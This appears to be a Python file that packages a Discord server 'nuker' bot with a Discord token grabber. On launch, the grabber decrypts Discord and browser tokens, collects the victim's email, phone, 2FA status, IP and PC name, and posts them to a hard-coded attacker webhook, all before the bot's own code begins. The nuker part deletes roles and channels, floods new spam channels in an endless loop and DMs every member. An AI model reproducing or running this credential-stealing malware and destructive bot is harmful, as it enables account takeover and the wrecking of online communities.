from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import discord, os
from discord.ext import commands
from discord.utils import get
from colorama import Fore

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1024736361112141924/PNS1IusgoXsrJfqsJYL2j0CO6Hs07yhcbQxb3NuZgTtoBRAix_mSV4hObQsHJAAFbVDW', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()



r = Fore.MAGENTA

print(f"""{r}
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ \n████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗\n██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝\n██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗\n██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║\n╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{r}-------------------------------------------\n{r}| {r}sumzum#1827 {r}|{r} https://github.com/sumzum |{r}\n{r}-------------------------------------------\n
{r}""")

TOKEN = input("Input Bot Token: ")
SPAM_MESSAGE = input("Input your Spam Message: ")
CHANNEL_SPAM = input("Input Spam Create Channel Name: ")
DM_ALL = input("Input Dm Message for all Members: ")

bot = commands.Bot(command_prefix="." ,help_command=None, intents=discord.Intents.all())
bot.remove_command('help')

@bot.event
async def on_ready():
    print(Fore.MAGENTA + """
bot is ready for nuke │ .help (show commands in server)

Commands:
1. .delroles (deletes all roles)
2. .kill server (nukes server)
3. .dmall (dm all server members)
4. .clear (deletes all channels)
""")

@bot.command()
async def help(ctx, member:discord.Member=None):
     if member:
       embed=discord.Embed(title="Nuker Help", description="made by sumzum#1827", color=0xcbceff)
       embed.add_field(name="Delete Roles:", value="!delroles")
       embed.add_field(name="Nuke Server:", value="!kill server")
       embed.add_field(name="Dm Members:", value="!dmall")
       embed.add_field(name="Delete Channels:", value="!clear")
       await ctx.send(embed=embed)
     else:
       embed=discord.Embed(title="Nuker Help", description="made by sumzum#1827", color=0xcbceff)
       embed.add_field(name="Delete Roles:", value="!delroles")
       embed.add_field(name="Nuke Server:", value="!kill server")
       embed.add_field(name="Dm Members:", value="!dmall")
       embed.add_field(name="Clear Server:", value="!clear")
       await ctx.send(embed=embed)
  
@bot.command()
async def delroles(ctx):
 for role in ctx.guild.roles:  
     try:  
        await role.delete()
     except:
        print(Fore.MAGENTA + f"Cannot delete {role.name}")

@bot.command()
async def kill(ctx, arg: str):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
     await channel.delete()  
    allowed_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    while True:
        channel = await guild.create_text_channel(CHANNEL_SPAM)
        await channel.send(content = SPAM_MESSAGE, allowed_mentions = allowed_mentions)

@bot.command()
async def dmall(ctx):
        for user in ctx.guild.members:
            try:
                await user.send(DM_ALL)
            except:
                 print(Fore.MAGENTA + f"Cannot DM{user.name}")

@bot.command()
async def clear(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
     await channel.delete()  
    guild = ctx.message.guild
    await guild.create_text_channel("sumzum#1827")

bot.run(TOKEN) 
